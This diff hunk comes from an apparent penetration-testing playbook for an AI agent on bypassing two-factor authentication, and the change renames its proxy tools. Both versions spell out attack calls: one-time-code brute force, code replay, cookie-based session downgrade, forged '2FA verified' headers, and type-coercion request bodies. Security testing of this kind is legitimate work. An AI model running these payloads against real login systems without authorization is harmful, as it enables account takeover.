@@ -61,18 +61,18 @@ Every 2FA gate has fallback paths. Find them all:
 
 The fallback flow is usually the bypass.
 
-## Captured-traffic workflow (proxy_* tools)
+## Captured-traffic workflow (proxy_brain tools)
 
-If HTTP Traffic Capture is enabled, source and drive the second-factor probes from the recorded login flow instead of rebuilding the validation request by hand. proxy_* tools only see traffic that went through the capture proxy, so drive the first factor + 2FA prompt through it first, then work from the captured `/auth/2fa/verify` transaction.
+If HTTP Traffic Capture is enabled, source and drive the second-factor probes from the recorded login flow instead of rebuilding the validation request by hand. proxy_brain tools only see traffic that went through the capture proxy, so drive the first factor + 2FA prompt through it first, then work from the captured `/auth/2fa/verify` transaction.
 
-- OTP brute force (attack 1) is proxy_fuzz when the code rides a query parameter: `proxy_fuzz(<verify_txn>, "code", ["000000","000001","000002"])` returns per-payload status+length, so a valid code stands out by a differing body length or a 200. proxy_fuzz caps at 50 payloads and only walks a query param, so for the full space or a JSON / form body position, iterate `proxy_replay(<verify_txn>, {"body":"{\"code\":\"NNNNNN\"}"})` in a loop.
-- Code reuse / replay (attack 3): `proxy_replay(<successful_verify_txn>, {})` re-submits the same code after logout to test single-use enforcement.
-- Session-state downgrade (attack 6): `proxy_replay(<sensitive_txn>, {"dropHeaders":["Cookie"],"cookie":"sid_partial=<intermediate>"})` hits a sensitive endpoint with only the intermediate cookie.
-- Header-trust bypass (attack 14): `proxy_replay(<sensitive_txn>, {"headers":{"X-2FA-Verified":"true"}})`, then `{"headers":{"X-Skip-2FA":"1"}}`.
-- Parser-differential (attack 15): `proxy_replay(<verify_txn>, {"headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"code[]=1&code[]=2"})` and JSON coercion bodies (`{"code":null}`, `{"code":0}`, `{"code":[]}`).
-- `proxy_diff(<valid_code_txn>, <invalid_code_txn>)` reveals exactly what the server checks (the response diff between a valid and an invalid code); `proxy_to_curl(id)` renders the winning request for the report.
+- OTP brute force (attack 1) is redamon.fuzz when the code rides a query parameter: `redamon.fuzz(<verify_txn>, "code", ["000000","000001","000002"])` returns per-payload status+length, so a valid code stands out by a differing body length or a 200. redamon.fuzz caps at 50 payloads and only walks a query param, so for the full space or a JSON / form body position, iterate `redamon.replay(<verify_txn>, {"body":"{\"code\":\"NNNNNN\"}"})` in a loop.
+- Code reuse / replay (attack 3): `redamon.replay(<successful_verify_txn>, {})` re-submits the same code after logout to test single-use enforcement.
+- Session-state downgrade (attack 6): `redamon.replay(<sensitive_txn>, {"dropHeaders":["Cookie"],"cookie":"sid_partial=<intermediate>"})` hits a sensitive endpoint with only the intermediate cookie.
+- Header-trust bypass (attack 14): `redamon.replay(<sensitive_txn>, {"headers":{"X-2FA-Verified":"true"}})`, then `{"headers":{"X-Skip-2FA":"1"}}`.
+- Parser-differential (attack 15): `redamon.replay(<verify_txn>, {"headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"code[]=1&code[]=2"})` and JSON coercion bodies (`{"code":null}`, `{"code":0}`, `{"code":[]}`).
+- `redamon.diff(<valid_code_txn>, <invalid_code_txn>)` reveals exactly what the server checks (the response diff between a valid and an invalid code); `redamon.to_curl(id)` renders the winning request for the report.
 
-Caveat: proxy_fuzz iterates one query parameter only and is capped at 50 payloads, so large brute-force runs still belong in execute_code; proxy_replay pins host/scheme/port to the origin. Race-on-validation (attack 11) still needs execute_code for true parallelism.
+Caveat: redamon.fuzz iterates one query parameter only and is capped at 50 payloads, so large brute-force runs still belong in execute_code; redamon.replay pins host/scheme/port to the origin. Race-on-validation (attack 11) still needs execute_code for true parallelism.
 
 ## Attack matrix
 
